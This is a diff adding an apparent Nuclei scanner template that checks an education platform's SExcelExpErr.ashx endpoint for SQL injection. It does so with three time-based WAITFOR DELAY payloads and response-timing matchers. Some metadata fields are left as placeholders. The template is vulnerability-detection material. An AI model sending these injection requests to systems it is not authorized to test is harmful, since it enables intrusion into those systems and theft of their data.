@@ -1,0 +1,27 @@
+id: EDU-zhpt-SExcelExpErr-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 智慧平台SExcelExpErr存在SQL注入漏洞，攻击者可通过该漏洞获取数据敏感信息。
+  reference:
+    - https://github.com/wy876/POC/commit/e9ebc9ab7da2132f9afa9e813bfa98b15375ffca#diff-3394466de146386274fa3b5298cd1967a2e4ead17921e14d3e8e70557cc6d401R2
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ashx/KQ/SExcelExpErr.ashx?action=list&importtype=1%27%3BWAITFOR+DELAY+%270%3A0%3A3%27--"
+      - "{{BaseURL}}/ashx/KQ/SExcelExpErr.ashx?action=list&importtype=1%27%3BWAITFOR+DELAY+%270%3A0%3A6%27--"
+      - "{{BaseURL}}/ashx/KQ/SExcelExpErr.ashx?action=list&importtype=1%27%3BWAITFOR+DELAY+%270%3A0%3A9%27--"
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
+
+
